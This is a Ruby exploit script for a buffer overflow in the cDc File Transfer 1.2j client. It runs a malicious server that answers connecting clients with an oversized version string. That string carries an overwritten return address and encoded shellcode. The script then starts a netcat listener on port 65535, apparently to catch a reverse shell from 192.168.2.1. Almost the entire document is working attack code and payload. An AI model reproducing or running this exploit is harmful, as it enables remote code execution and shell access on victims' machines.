#!/usr/bin/env ruby
# cDc File Transfer 1.2j Client Buffer Overflow
#
# when sending a overly long version response to a connecting client, an
# attacker can execute arbitrary code in the context of the currently
# logged-on user. file-transfer.sourceforge.net

require 'rex'
require 'socket'
# 192.168.2.1/65535
pay = 
"\xdd\xc6\xbb\x4d\xfa\xe7\xdc\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\x8f\xfe\x05\x29\xf3" +
"\x17\x4b\xd2\x0b\xe8\x2c\x5a\xee\xd9\x6c\x38\x7b\x49\x5d" +
"\x4a\x29\x66\x16\x1e\xd9\xfd\x5a\xb7\xee\xb6\xd1\xe1\xc1" +
"\x47\x49\xd1\x40\xc4\x90\x06\xa2\xf5\x5a\x5b\xa3\x32\x86" +
"\x96\xf1\xeb\xcc\x05\xe5\x98\x99\x95\x8e\xd3\x0c\x9e\x73" +
"\xa3\x2f\x8f\x22\xbf\x69\x0f\xc5\x6c\x02\x06\xdd\x71\x2f" +
"\xd0\x56\x41\xdb\xe3\xbe\x9b\x24\x4f\xff\x13\xd7\x91\x38" +
"\x93\x08\xe4\x30\xe7\xb5\xff\x87\x95\x61\x75\x13\x3d\xe1" +
"\x2d\xff\xbf\x26\xab\x74\xb3\x83\xbf\xd2\xd0\x12\x13\x69" +
"\xec\x9f\x92\xbd\x64\xdb\xb0\x19\x2c\xbf\xd9\x38\x88\x6e" +
"\xe5\x5a\x73\xce\x43\x11\x9e\x1b\xfe\x78\xf7\xe8\x33\x82" +
"\x07\x67\x43\xf1\x35\x28\xff\x9d\x75\xa1\xd9\x5a\x79\x98" +
"\x9e\xf4\x84\x23\xdf\xdd\x42\x77\x8f\x75\x62\xf8\x44\x85" +
"\x8b\x2d\xca\xd5\x23\x9e\xab\x85\x83\x4e\x44\xcf\x0b\xb0" +
"\x74\xf0\xc1\xd9\x1f\x0b\x82\x25\x77\x11\x53\xce\x8a\x15" +
"\xac\xf1\x02\xf3\x38\x1e\x43\xac\xd4\x87\xce\x26\x44\x47" +
"\xc5\x43\x46\xc3\xea\xb4\x09\x24\x86\xa6\xfe\xc4\xdd\x94" +
"\xa9\xdb\xcb\xb0\x36\x49\x90\x40\x30\x72\x0f\x17\x15\x44" +
"\x46\xfd\x8b\xff\xf0\xe3\x51\x99\x3b\xa7\x8d\x5a\xc5\x26" +
"\x43\xe6\xe1\x38\x9d\xe7\xad\x6c\x71\xbe\x7b\xda\x37\x68" +
"\xca\xb4\xe1\xc7\x84\x50\x77\x24\x17\x26\x78\x61\xe1\xc6" +
"\xc9\xdc\xb4\xf9\xe6\x88\x30\x82\x1a\x29\xbe\x59\x9f\x59" +
"\xf5\xc3\xb6\xf1\x50\x96\x8a\x9f\x62\x4d\xc8\x99\xe0\x67" +
"\xb1\x5d\xf8\x02\xb4\x1a\xbe\xff\xc4\x33\x2b\xff\x7b\x33" +
"\x7e"

buff = "A" * 1500

buff[1204, 4] = [0x969606eb].pack('V')
buff[1208, 4] = [0x432774].pack('V')
buff[1212, pay.size] = pay.force_encoding("ASCII-8BIT")

server = TCPServer.new 14567

1.upto(2) do
  client =  server.accept
  client.write("\x31\x2e\x32\x6a" + buff)
end
system("nc -v -l 65535")
